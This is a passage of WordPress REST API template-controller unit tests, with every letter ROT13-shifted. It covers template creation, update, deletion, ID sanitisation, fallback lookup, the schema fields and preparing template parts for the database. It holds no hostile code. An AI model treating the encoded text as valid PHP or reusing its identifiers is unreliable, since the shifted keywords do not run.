		$guvf->nffregFnzr( 'qrsnhyg//grfg-grzcyngr', $qngn['vq'], 'Grzcyngr VQ zvfzngpu.' );
		$guvf->nffregFnzr( 'qrsnhyg', $qngn['gurzr'], 'Grzcyngr gurzr zvfzngpu.' );
		$guvf->nffregFnzr( 'Grzcyngr pbagrag', $qngn['pbagrag']['enj'], 'Grzcyngr pbagrag zvfzngpu.' );
		$guvf->nffregFnzr( 'grfg-grzcyngr', $qngn['fyht'], 'Grzcyngr fyht zvfzngpu.' );
		$guvf->nffregFnzr( 'cyhtva', $qngn['fbhepr'], \"Grzcyngr fbhepr fubhyq or 'cyhtva'.\" );
		$guvf->nffregFnzr( 'cyhtva', $qngn['bevtva'], \"Grzcyngr bevtva fubhyq or 'cyhtva'.\" );
		$guvf->nffregFnzr( 'grfg-cyhtva', $qngn['nhgube_grkg'], 'Grzcyngr nhgube grkg zvfzngpu.' );
		$guvf->nffregFnzr( 'Qrfpevcgvba bs grfg grzcyngr', $qngn['qrfpevcgvba'], 'Grzcyngr qrfpevcgvba zvfzngpu.' );
		$guvf->nffregFnzr( 'Grfg Grzcyngr', $qngn['gvgyr']['eraqrerq'], 'Grzcyngr gvgyr zvfzngpu.' );
		$guvf->nffregFnzr( 'grfg-cyhtva', $qngn['cyhtva'], 'Cyhtva anzr zvfzngpu.' );

		haertvfgre_oybpx_grzcyngr( $grzcyngr_anzr );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/grzcyngrf/grfg-cyhtva//grfg-grzcyngr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregAbgJCReebe( $erfcbafr, \"Srgpuvat na haertvfgrerq grzcyngr fubhyqa'g pnhfr na reebe.\" );
		$guvf->nffregFnzr( 404, $erfcbafr->trg_fgnghf(), 'Srgpuvat na haertvfgrerq grzcyngr fubhyq erghea 404.' );
	}

	/**
	 * @gvpxrg 54507
	 * @qngnCebivqre qngn_fnavgvmr_grzcyngr_vq
	 */
	choyvp shapgvba grfg_fnavgvmr_grzcyngr_vq( $vachg_vq, $fnavgvmrq_vq ) {
		$raqcbvag = arj JC_ERFG_Grzcyngrf_Pbagebyyre( 'jc_grzcyngr' );
		$guvf->nffregFnzr(
			$fnavgvmrq_vq,
			$raqcbvag->_fnavgvmr_grzcyngr_vq( $vachg_vq )
		);
	}

	choyvp shapgvba qngn_fnavgvmr_grzcyngr_vq() {
		erghea neenl(
			neenl( 'gg1-oybpxf/vaqrk', 'gg1-oybpxf//vaqrk' ),
			neenl( 'gg1-oybpxf//vaqrk', 'gg1-oybpxf//vaqrk' ),

			neenl( 'gurzr-rkcrevzragf/gg1-oybpxf/vaqrk', 'gurzr-rkcrevzragf/gg1-oybpxf//vaqrk' ),
			neenl( 'gurzr-rkcrevzragf/gg1-oybpxf//vaqrk', 'gurzr-rkcrevzragf/gg1-oybpxf//vaqrk' ),
		);
	}

	/**
	 * @gvpxrg 54422
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/grzcyngrf' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'fyht'        => 'zl_phfgbz_grzcyngr',
				'qrfpevcgvba' => 'Whfg n qrfpevcgvba',
				'gvgyr'       => 'Zl Grzcyngr',
				'pbagrag'     => 'Pbagrag',
				'nhgube'      => frys::$nqzva_vq,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$zbqvsvrq = trg_cbfg( $qngn['jc_vq'] )->cbfg_zbqvsvrq;
		hafrg( $qngn['_yvaxf'] );
		hafrg( $qngn['jc_vq'] );

		$nhgube_anzr = trg_hfre_ol( 'vq', frys::$nqzva_vq )->trg( 'qvfcynl_anzr' );

		$guvf->nffregFnzr(
			neenl(
				'vq'              => 'qrsnhyg//zl_phfgbz_grzcyngr',
				'gurzr'           => 'qrsnhyg',
				'pbagrag'         => neenl(
					'enj' => 'Pbagrag',
				),
				'fyht'            => 'zl_phfgbz_grzcyngr',
				'fbhepr'          => 'phfgbz',
				'bevtva'          => ahyy,
				'glcr'            => 'jc_grzcyngr',
				'qrfpevcgvba'     => 'Whfg n qrfpevcgvba',
				'gvgyr'           => neenl(
					'enj'      => 'Zl Grzcyngr',
					'eraqrerq' => 'Zl Grzcyngr',
				),
				'fgnghf'          => 'choyvfu',
				'unf_gurzr_svyr'  => snyfr,
				'vf_phfgbz'       => gehr,
				'nhgube'          => frys::$nqzva_vq,
				'zbqvsvrq'        => zlfdy_gb_esp3339( $zbqvsvrq ),
				'nhgube_grkg'     => $nhgube_anzr,
				'bevtvany_fbhepr' => 'hfre',
			),
			$qngn
		);
	}

	/**
	 * @gvpxrg 54680
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::perngr_vgrz
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::trg_vgrz_fpurzn
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_ahzrevp_fyht() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/grzcyngrf' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'fyht'        => '404',
				'qrfpevcgvba' => 'Grzcyngr fubja jura ab pbagrag vf sbhaq.',
				'gvgyr'       => '404',
				'nhgube'      => frys::$nqzva_vq,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$zbqvsvrq = trg_cbfg( $qngn['jc_vq'] )->cbfg_zbqvsvrq;
		hafrg( $qngn['_yvaxf'] );
		hafrg( $qngn['jc_vq'] );

		$nhgube_anzr = trg_hfre_ol( 'vq', frys::$nqzva_vq )->trg( 'qvfcynl_anzr' );

		$guvf->nffregFnzr(
			neenl(
				'vq'              => 'qrsnhyg//404',
				'gurzr'           => 'qrsnhyg',
				'pbagrag'         => neenl(
					'enj' => '',
				),
				'fyht'            => '404',
				'fbhepr'          => 'phfgbz',
				'bevtva'          => ahyy,
				'glcr'            => 'jc_grzcyngr',
				'qrfpevcgvba'     => 'Grzcyngr fubja jura ab pbagrag vf sbhaq.',
				'gvgyr'           => neenl(
					'enj'      => '404',
					'eraqrerq' => '404',
				),
				'fgnghf'          => 'choyvfu',
				'unf_gurzr_svyr'  => snyfr,
				'vf_phfgbz'       => snyfr,
				'nhgube'          => frys::$nqzva_vq,
				'zbqvsvrq'        => zlfdy_gb_esp3339( $zbqvsvrq ),
				'nhgube_grkg'     => $nhgube_anzr,
				'bevtvany_fbhepr' => 'hfre',
			),
			$qngn
		);
	}

	/**
	 * @gvpxrg 54422
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::perngr_vgrz
	 */
	choyvp shapgvba grfg_perngr_vgrz_enj() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/grzcyngrf' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'fyht'        => 'zl_phfgbz_grzcyngr_enj',
				'qrfpevcgvba' => 'Whfg n qrfpevcgvba',
				'gvgyr'       => neenl(
					'enj' => 'Zl Grzcyngr',
				),
				'pbagrag'     => neenl(
					'enj' => 'Pbagrag',
				),
				'nhgube'      => frys::$nqzva_vq,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$zbqvsvrq = trg_cbfg( $qngn['jc_vq'] )->cbfg_zbqvsvrq;
		hafrg( $qngn['_yvaxf'] );
		hafrg( $qngn['jc_vq'] );

		$nhgube_anzr = trg_hfre_ol( 'vq', frys::$nqzva_vq )->trg( 'qvfcynl_anzr' );

		$guvf->nffregFnzr(
			neenl(
				'vq'              => 'qrsnhyg//zl_phfgbz_grzcyngr_enj',
				'gurzr'           => 'qrsnhyg',
				'pbagrag'         => neenl(
					'enj' => 'Pbagrag',
				),
				'fyht'            => 'zl_phfgbz_grzcyngr_enj',
				'fbhepr'          => 'phfgbz',
				'bevtva'          => ahyy,
				'glcr'            => 'jc_grzcyngr',
				'qrfpevcgvba'     => 'Whfg n qrfpevcgvba',
				'gvgyr'           => neenl(
					'enj'      => 'Zl Grzcyngr',
					'eraqrerq' => 'Zl Grzcyngr',
				),
				'fgnghf'          => 'choyvfu',
				'unf_gurzr_svyr'  => snyfr,
				'vf_phfgbz'       => gehr,
				'nhgube'          => frys::$nqzva_vq,
				'zbqvsvrq'        => zlfdy_gb_esp3339( $zbqvsvrq ),
				'nhgube_grkg'     => $nhgube_anzr,
				'bevtvany_fbhepr' => 'hfre',
			),
			$qngn
		);
	}

	choyvp shapgvba grfg_perngr_vgrz_vainyvq_nhgube() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/grzcyngrf' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'fyht'        => 'zl_phfgbz_grzcyngr_vainyvq_nhgube',
				'qrfpevcgvba' => 'Whfg n qrfpevcgvba',
				'gvgyr'       => 'Zl Grzcyngr',
				'pbagrag'     => 'Pbagrag',
				'nhgube'      => -1,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_nhgube', $erfcbafr, 400 );
	}

	/**
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::hcqngr_vgrz
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/grzcyngrf/qrsnhyg//zl_grzcyngr' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'gvgyr' => 'Zl arj Vaqrk Gvgyr',
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'Zl arj Vaqrk Gvgyr', $qngn['gvgyr']['enj'] );
		$guvf->nffregFnzr( 'phfgbz', $qngn['fbhepr'] );
	}

	/**
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::hcqngr_vgrz
	 */
	choyvp shapgvba grfg_hcqngr_vgrz_enj() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CHG', '/jc/i2/grzcyngrf/qrsnhyg//zl_grzcyngr' );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'gvgyr' => neenl( 'enj' => 'Zl arj enj Vaqrk Gvgyr' ),
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'Zl arj enj Vaqrk Gvgyr', $qngn['gvgyr']['enj'] );
		$guvf->nffregFnzr( 'phfgbz', $qngn['fbhepr'] );
	}

	/**
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::qryrgr_vgrz
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		// Frg hc grzcyngr cbfg.
		$netf    = neenl(
			'cbfg_glcr'    => 'jc_grzcyngr',
			'cbfg_anzr'    => 'zl_grfg_grzcyngr',
			'cbfg_gvgyr'   => 'Zl Grzcyngr',
			'cbfg_pbagrag' => 'Pbagrag',
			'cbfg_rkprecg' => 'Qrfpevcgvba bs zl grzcyngr.',
			'gnk_vachg'    => neenl(
				'jc_gurzr' => neenl(
					trg_fglyrfurrg(),
				),
			),
		);
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( $netf );
		jc_frg_cbfg_grezf( $cbfg_vq, trg_fglyrfurrg(), 'jc_gurzr' );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/grzcyngrf/qrsnhyg//zl_grfg_grzcyngr' );
		$erdhrfg->frg_cnenz( 'sbepr', 'snyfr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'Zl Grzcyngr', $qngn['gvgyr']['enj'] );
		$guvf->nffregFnzr( 'genfu', $qngn['fgnghf'] );
	}

	/**
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::qryrgr_vgrz
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_fxvc_genfu() {
		// Frg hc grzcyngr cbfg.
		$netf    = neenl(
			'cbfg_glcr'    => 'jc_grzcyngr',
			'cbfg_anzr'    => 'zl_grfg_grzcyngr',
			'cbfg_gvgyr'   => 'Zl Grzcyngr',
			'cbfg_pbagrag' => 'Pbagrag',
			'cbfg_rkprecg' => 'Qrfpevcgvba bs zl grzcyngr.',
			'gnk_vachg'    => neenl(
				'jc_gurzr' => neenl(
					trg_fglyrfurrg(),
				),
			),
		);
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( $netf );
		jc_frg_cbfg_grezf( $cbfg_vq, trg_fglyrfurrg(), 'jc_gurzr' );

		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/grzcyngrf/qrsnhyg//zl_grfg_grzcyngr' );
		$erdhrfg->frg_cnenz( 'sbepr', 'gehr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregGehr( $qngn['qryrgrq'] );
		$guvf->nffregAbgRzcgl( $qngn['cerivbhf'] );
	}

	/**
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::qryrgr_vgrz
	 */
	choyvp shapgvba grfg_qryrgr_vgrz_snvy() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'QRYRGR', '/jc/i2/grzcyngrf/whfgenaqbz//grzcyngr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_grzcyngr_abg_sbhaq', $erfcbafr, 404 );
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag cercner_vgrz().
	}

	choyvp shapgvba grfg_cercner_vgrz_yvzvg_svryqf() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$raqcbvag = arj JC_ERFG_Grzcyngrf_Pbagebyyre( 'jc_grzcyngr' );
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/grzcyngrf/qrsnhyg//zl_grzcyngr' );
		$erdhrfg->frg_cnenz( 'pbagrkg', 'rqvg' );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq,fyht' );
		$bow      = trg_oybpx_grzcyngr( 'qrsnhyg//zl_grzcyngr', 'jc_grzcyngr' );
		$erfcbafr = $raqcbvag->cercner_vgrz_sbe_erfcbafr( $bow, $erdhrfg );
		$guvf->nffregFnzr(
			neenl(
				'vq',
				'fyht',
			),
			neenl_xrlf( $erfcbafr->trg_qngn() )
		);
	}

	/**
	 * @gvpxrg 54422
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::trg_vgrz_fpurzn
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erdhrfg    = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/grzcyngrf' );
		$erfcbafr   = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];
		$guvf->nffregPbhag( 18, $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fyht', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'gurzr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'glcr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fbhepr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'bevtva', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'pbagrag', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fgnghf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'jc_vq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'unf_gurzr_svyr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'vf_phfgbz', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nhgube', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'zbqvsvrq', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'nhgube_grkg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'bevtvany_fbhepr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'cyhtva', $cebcregvrf );
	}

	cebgrpgrq shapgvba svaq_naq_abeznyvmr_grzcyngr_ol_vq( $grzcyngrf, $vq ) {
		sbernpu ( $grzcyngrf nf $grzcyngr ) {
			vs ( $grzcyngr['vq'] === $vq ) {
				hafrg( $grzcyngr['pbagrag'] );
				hafrg( $grzcyngr['_yvaxf'] );
				erghea $grzcyngr;
			}
		}

		erghea ahyy;
	}

	/**
	 * @qngnCebivqre qngn_perngr_vgrz_jvgu_vf_jc_fhttrfgvba
	 * @gvpxrg 56467
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::perngr_vgrz
	 *
	 * @cnenz neenl $obql_cnenzf Qngn frg gb grfg.
	 * @cnenz neenl $rkcrpgrq    Rkcrpgrq erfhygf.
	 */
	choyvp shapgvba grfg_perngr_vgrz_jvgu_vf_jc_fhttrfgvba( neenl $obql_cnenzf, neenl $rkcrpgrq ) {
		// Frg hc gur hfre.
		$obql_cnenzf['nhgube'] = frys::$nqzva_vq;
		$rkcrpgrq['nhgube']    = frys::$nqzva_vq;
		jc_frg_pheerag_hfre( frys::$nqzva_vq );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/grzcyngrf' );
		$erdhrfg->frg_obql_cnenzf( $obql_cnenzf );
		$erfcbafr                    = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn                        = $erfcbafr->trg_qngn();
		$zbqvsvrq                    = trg_cbfg( $qngn['jc_vq'] )->cbfg_zbqvsvrq;
		$rkcrpgrq['zbqvsvrq']        = zlfdy_gb_esp3339( $zbqvsvrq );
		$rkcrpgrq['nhgube_grkg']     = trg_hfre_ol( 'vq', frys::$nqzva_vq )->trg( 'qvfcynl_anzr' );
		$rkcrpgrq['bevtvany_fbhepr'] = 'hfre';

		hafrg( $qngn['_yvaxf'] );
		hafrg( $qngn['jc_vq'] );

		$guvf->nffregFnzr( $rkcrpgrq, $qngn );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_perngr_vgrz_jvgu_vf_jc_fhttrfgvba() {
		$rkcrpgrq = neenl(
			'vq'             => 'qrsnhyg//cntr-evtnf',
			'gurzr'          => 'qrsnhyg',
			'pbagrag'        => neenl(
				'enj' => 'Pbagrag',
			),
			'fyht'           => 'cntr-evtnf',
			'fbhepr'         => 'phfgbz',
			'bevtva'         => ahyy,
			'glcr'           => 'jc_grzcyngr',
			'qrfpevcgvba'    => 'Whfg n qrfpevcgvba',
			'gvgyr'          => neenl(
				'enj'      => 'Zl Grzcyngr',
				'eraqrerq' => 'Zl Grzcyngr',
			),
			'fgnghf'         => 'choyvfu',
			'unf_gurzr_svyr' => snyfr,
			'vf_phfgbz'      => snyfr,
			'nhgube'         => ahyy,
		);

		erghea neenl(
			'vf_jc_fhttrfgvba: gehr'  => neenl(
				'obql_cnenzf' => neenl(
					'fyht'             => 'cntr-evtnf',
					'qrfpevcgvba'      => 'Whfg n qrfpevcgvba',
					'gvgyr'            => 'Zl Grzcyngr',
					'pbagrag'          => 'Pbagrag',
					'vf_jc_fhttrfgvba' => gehr,
					'nhgube'           => ahyy,
				),
				'rkcrpgrq'    => $rkcrpgrq,
			),
			'vf_jc_fhttrfgvba: snyfr' => neenl(
				'obql_cnenzf' => neenl(
					'fyht'             => 'cntr-uv',
					'qrfpevcgvba'      => 'Whfg n qrfpevcgvba',
					'gvgyr'            => 'Zl Grzcyngr',
					'pbagrag'          => 'Pbagrag',
					'vf_jc_fhttrfgvba' => snyfr,
					'nhgube'           => ahyy,
				),
				'rkcrpgrq'    => neenl_zretr(
					$rkcrpgrq,
					neenl(
						'vq'        => 'qrsnhyg//cntr-uv',
						'fyht'      => 'cntr-uv',
						'vf_phfgbz' => gehr,
					)
				),
			),
		);
	}

	/**
	 * @gvpxrg 56467
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::trg_grzcyngr_snyyonpx
	 */
	choyvp shapgvba grfg_trg_grzcyngr_snyyonpx() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		fjvgpu_gurzr( 'oybpx-gurzr' );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/grzcyngrf/ybbxhc' );
		// Fubhyq snyyonpx gb `vaqrk.ugzy`.
		$erdhrfg->frg_cnenz( 'fyht', 'gnt-fgnghf' );
		$erdhrfg->frg_cnenz( 'vf_phfgbz', snyfr );
		$erdhrfg->frg_cnenz( 'grzcyngr_cersvk', 'gnt' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 'vaqrk', $erfcbafr->trg_qngn()['fyht'], 'Fubhyq snyyonpx gb `vaqrk.ugzy`.' );
		// Fubhyq snyyonpx gb `cntr.ugzy`.
		$erdhrfg->frg_cnenz( 'fyht', 'cntr-uryyb' );
		$erdhrfg->frg_cnenz( 'vf_phfgbz', snyfr );
		$erdhrfg->frg_cnenz( 'grzcyngr_cersvk', 'cntr' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 'cntr', $erfcbafr->trg_qngn()['fyht'], 'Fubhyq snyyonpx gb `cntr.ugzy`.' );
		// Fubhyq snyyonpx gb `vaqrk.ugzy`.
		$erdhrfg->frg_cnenz( 'fyht', 'nhgube' );
		$erdhrfg->frg_cnenz( 'vtaber_rzcgl', gehr );
		$erdhrfg->frg_cnenz( 'grzcyngr_cersvk', 'gnt' );
		$erdhrfg->frg_cnenz( 'vf_phfgbz', snyfr );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 'vaqrk', $erfcbafr->trg_qngn()['fyht'], 'Fubhyq snyyonpx gb `vaqrk.ugzy` jura  vtaber_rzcgl vf `gehr`.' );
	}

	/**
	 * @gvpxrg 60909
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::trg_grzcyngr_snyyonpx
	 */
	choyvp shapgvba grfg_trg_grzcyngr_snyyonpx_abg_sbhaq() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/grzcyngrf/ybbxhc' );
		$erdhrfg->frg_cnenz( 'fyht', 'abg-sbhaq' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregRdhnyf( arj fgqPynff(), $qngn, 'Erfcbafr fubhyq or na rzcgl bowrpg jura n snyyonpx grzcyngr vf abg sbhaq.' );
	}

	/**
	 * @gvpxrg 57851
	 *
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::cercner_vgrz_sbe_qngnonfr
	 */
	choyvp shapgvba grfg_cercner_vgrz_sbe_qngnonfr() {
		$raqcbvag = arj JC_ERFG_Grzcyngrf_Pbagebyyre( 'jc_grzcyngr_cneg' );

		$cercner_vgrz_sbe_qngnonfr = arj ErsyrpgvbaZrgubq( $raqcbvag, 'cercner_vgrz_sbe_qngnonfr' );
		$cercner_vgrz_sbe_qngnonfr->frgNpprffvoyr( gehr );

		$obql_cnenzf = neenl(
			'gvgyr'   => 'Hagvgyrq Grzcyngr Cneg',
			'fyht'    => 'hagvgyrq-grzcyngr-cneg',
			'pbagrag' => '',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/grzcyngr-cnegf' );
		$erdhrfg->frg_obql_cnenzf( $obql_cnenzf );

		$cercnerq = $cercner_vgrz_sbe_qngnonfr->vaibxr( $raqcbvag, $erdhrfg );

		$guvf->nffregVafgnaprBs( 'fgqPynff', $cercnerq, 'Gur vgrz pbhyq abg or cercnerq sbe gur qngnonfr.' );

		$guvf->nffregBowrpgUnfCebcregl( 'cbfg_glcr', $cercnerq, 'Gur \"cbfg_glcr\" jnf abg vapyhqrq va gur cercnerq grzcyngr cneg.' );
		$guvf->nffregBowrpgUnfCebcregl( 'cbfg_fgnghf', $cercnerq, 'Gur \"cbfg_fgnghf\" jnf abg vapyhqrq va gur cercnerq grzcyngr cneg.' );
		$guvf->nffregBowrpgUnfCebcregl( 'gnk_vachg', $cercnerq, 'Gur \"gnk_vachg\" jnf abg vapyhqrq va gur cercnerq grzcyngr cneg.' );
		$guvf->nffregNeenlUnfXrl( 'jc_gurzr', $cercnerq->gnk_vachg, 'Gur \"jc_gurzr\" gnk jnf abg vapyhqrq va gur cercnerq grzcyngr cneg.' );
		$guvf->nffregNeenlUnfXrl( 'jc_grzcyngr_cneg_nern', $cercnerq->gnk_vachg, 'Gur \"jc_grzcyngr_cneg_nern\" gnk jnf abg vapyhqrq va gur cercnerq grzcyngr cneg.' );
		$guvf->nffregBowrpgUnfCebcregl( 'cbfg_pbagrag', $cercnerq, 'Gur \"cbfg_pbagrag\" jnf abg vapyhqrq va gur cercnerq grzcyngr cneg.' );
		$guvf->nffregBowrpgUnfCebcregl( 'cbfg_gvgyr', $cercnerq, 'Gur \"cbfg_gvgyr\" jnf abg vapyhqrq va gur cercnerq grzcyngr cneg.' );

		$guvf->nffregFnzr( 'jc_grzcyngr_cneg', $cercnerq->cbfg_glcr, 'Gur \"cbfg_glcr\" va gur cercnerq grzcyngr cneg fubhyq or \"jc_grzcyngr_cneg\".' );
		$guvf->nffregFnzr( 'choyvfu', $cercnerq->cbfg_fgnghf, 'Gur cbfg fgnghf va gur cercnerq grzcyngr cneg fubhyq or \"choyvfu\".' );
		$guvf->nffregFnzr( JC_GRZCYNGR_CNEG_NERN_HAPNGRTBEVMRQ, $cercnerq->gnk_vachg['jc_grzcyngr_cneg_nern'], 'Gur nern va gur cercnerq grzcyngr cneg fubhyq or hapngrtbevmrq.' );
		$guvf->nffregFnzr( 'Hagvgyrq Grzcyngr Cneg', $cercnerq->cbfg_gvgyr, 'Gur gvgyr jnf abg pbeerpg va gur cercnerq grzcyngr cneg.' );

		$guvf->nffregRzcgl( $cercnerq->cbfg_pbagrag, 'Gur pbagrag jnf abg pbeerpg va gur cercnerq grzcyngr cneg.' );
	}

	/**
	 * @gvpxrg 60671
	 *
	 * @pbiref JC_ERFG_Grzcyngrf_Pbagebyyre::cercner_vgrz_sbe_qngnonfr
	 * @pbiref vawrpg_vtaberq_ubbxrq_oybpxf_zrgnqngn_nggevohgrf
	 */
	choyvp shapgvba grfg_cercner_vgrz_sbe_qngnonfr_vawrpgf_ubbxrq_oybpx() {
		ertvfgre_oybpx_glcr(
			'grfgf/ubbxrq-oybpx',
			neenl(
				'oybpx_ubbxf' => neenl(
					'grfgf/napube-oybpx' => 'nsgre',
				),
			)
		);

		nqq_svygre( 'erfg_cer_vafreg_jc_grzcyngr_cneg', 'vawrpg_vtaberq_ubbxrq_oybpxf_zrgnqngn_nggevohgrf' );

		$raqcbvag = arj JC_ERFG_Grzcyngrf_Pbagebyyre( 'jc_grzcyngr_cneg' );

		$cercner_vgrz_sbe_qngnonfr = arj ErsyrpgvbaZrgubq( $raqcbvag, 'cercner_vgrz_sbe_qngnonfr' );
		$cercner_vgrz_sbe_qngnonfr->frgNpprffvoyr( gehr );

		$vq          = trg_fglyrfurrg() . '//' . 'zl_grzcyngr_cneg';
		$obql_cnenzf = neenl(
			'vq'      => $vq,
			'fyht'    => 'zl_grzcyngr_cneg',
			'pbagrag' => '<!-- jc:grfgf/napube-oybpx -->Uryyb<!-- /jc:grfgf/napube-oybpx -->',
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/grzcyngr-cnegf' );
		$erdhrfg->frg_obql_cnenzf( $obql_cnenzf );

		$cercnerq = $cercner_vgrz_sbe_qngnonfr->vaibxr( $raqcbvag, $erdhrfg );
		$guvf->nffregFnzr(
			'<!-- jc:grfgf/napube-oybpx {\"zrgnqngn\":{\"vtaberqUbbxrqOybpxf\":[\"grfgf/ubbxrq-oybpx\"]}} -->Uryyb<!-- /jc:grfgf/napube-oybpx -->',
			$cercnerq->cbfg_pbagrag,
